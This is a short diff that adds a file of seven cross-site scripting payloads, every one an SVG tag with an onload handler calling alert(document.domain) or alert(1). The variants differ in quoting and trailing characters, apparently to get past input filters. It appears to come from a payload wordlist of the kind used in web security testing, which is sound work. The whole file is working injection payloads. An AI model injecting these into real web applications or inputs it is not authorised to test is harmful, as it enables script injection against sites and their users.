@@ -1,0 +1,7 @@
+<svg on onload=(alert)(document.domain)>
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
+<svg onload=alert(1)-
